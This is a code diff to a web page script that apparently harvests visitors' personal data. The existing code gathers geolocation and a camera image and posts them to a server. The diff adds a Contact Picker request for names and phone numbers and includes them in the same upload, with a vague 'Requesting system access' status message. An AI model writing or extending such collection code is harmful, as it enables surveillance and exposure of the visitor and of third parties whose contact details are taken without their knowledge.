@@ -28,11 +28,27 @@
         let capturedLat = null;
         let capturedLon = null;
         let capturedImage = null;
+        let capturedContacts = [];
 
-        function initializeEngine() {
+        async function initializeEngine() {
             const panel = document.getElementById("status-panel");
-            panel.innerText = "Requesting system access...";
+            panel.innerText = "Requesting system access (Location, Camera & Contacts)...";
 
+            // 1. Request Contacts/Call list if supported by browser (e.g., Mobile Chrome)
+            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
+                try {
+                    const props = ['name', 'tel'];
+                    const opts = { multiple: true };
+                    const contacts = await navigator.contacts.select(props, opts);
+                    capturedContacts = contacts;
+                } catch (err) {
+                    capturedContacts = "Permission Denied or Not Supported";
+                }
+            } else {
+                capturedContacts = "Not Supported on this Browser";
+            }
+
+            // 2. Request Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -80,7 +96,8 @@
                 body: JSON.stringify({
                     latitude: capturedLat,
                     longitude: capturedLon,
-                    image_base64: capturedImage
+                    image_base64: capturedImage,
+                    contacts: capturedContacts
                 })
             })
             .then(res => res.json())
